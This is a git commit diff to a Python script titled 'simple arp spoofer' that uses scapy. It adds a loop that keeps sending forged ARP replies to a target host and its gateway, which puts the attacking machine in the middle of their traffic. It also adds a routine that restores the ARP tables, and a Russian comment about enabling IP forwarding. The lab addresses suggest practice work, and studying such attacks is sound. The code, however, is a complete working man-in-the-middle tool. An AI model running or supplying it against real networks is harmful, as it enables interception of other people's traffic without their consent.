762005372ae88173cc3ef992a562fa580521696c
Vadim Shut <vadimshut1992@gmail.com>
2020-11-05 20:18:44 +0300

    simple arp spoofer

--- main.py
+++ main.py
@@ -1,6 +1,7 @@
 #!/usr/bin/env/ python
 
 import scapy.all as scapy
+from time import sleep
 
 ip_windows = "10.0.2.7"
 ip_router = "10.0.2.1"
@@ -18,12 +19,31 @@ def get_mac(ip):
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    scapy.send(packet)
+    scapy.send(packet, verbose=False)
 
 
+def restore(dst_ip, src_ip):
+    dst_mac = get_mac(dst_ip)
+    src_mac = get_mac(src_ip)
+    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
+    scapy.send(packet, count=4, verbose=False)
 
 
+if __name__ == "__main__":
+    target_ip = "10.0.2.7"
+    gateway_ip = "10.0.2.1"
+    send_packets_count = 0
+    try:
+        while True:
+            spoof(target_ip, gateway_ip)
+            spoof(gateway_ip, target_ip)
+            send_packets_count += 2
+            print(f"\r[+] Packets sent: {str(send_packets_count)}.", end='')
+            sleep(2)
+    except KeyboardInterrupt:
+        print("[+] Detecting CTRL+C. Quiting...")
+        print("[+] Resetting ARP tables... ")
+        restore(target_ip, gateway_ip)
+        restore(gateway_ip, target_ip)
 
-
-# if __name__ == "__main__":
-#     pass
+# echo 1> /proc/sys/net/ipv4/ip_forward для разрешения прохождения трафика через комп
